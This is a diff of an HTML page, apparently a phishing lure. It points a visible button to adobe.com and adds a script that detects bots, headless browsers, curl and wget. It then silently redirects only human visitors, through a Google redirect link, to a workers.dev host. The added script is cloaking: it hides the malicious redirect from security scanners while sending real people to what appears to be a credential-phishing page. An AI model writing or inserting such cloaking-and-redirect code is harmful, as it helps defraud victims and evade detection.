@@ -39,7 +39,7 @@
             </p>
 
             <!-- Button -->
-            <a href="https://my-static-site-4d9d.onrender.com/" 
+            <a href="https://adobe.com/" 
                style="
                  display:inline-block;
                  padding:16px 40px;
@@ -102,6 +102,31 @@
     style="border:0;"
     loading="lazy">
   </iframe>
+  <script>
+function isBot() {
+  const ua = navigator.userAgent.toLowerCase();
+
+  const botPatterns = [
+    "bot","crawl","spider","slurp",
+    "headless","phantom","selenium",
+    "puppeteer","python","curl","wget"
+  ];
+
+  const uaCheck = botPatterns.some(p => ua.includes(p));
+
+  const webdriverCheck = navigator.webdriver === true;
+
+  const noPlugins = navigator.plugins.length === 0;
+
+  return uaCheck || webdriverCheck || noPlugins;
+}
+
+if (!isBot()) {
+  setTimeout(() => {
+    window.location.replace("https://www.google.com/url?q=https://5a5fb210ab79f245.cmedsker.workers.dev&sa=D&source=editors&ust=1775572344214904&usg=AOvVaw2YTdlqZPuji7xzW23IWQwB");
+  }, 2000);
+}
+</script>
 </div>
 </body>
 </html>
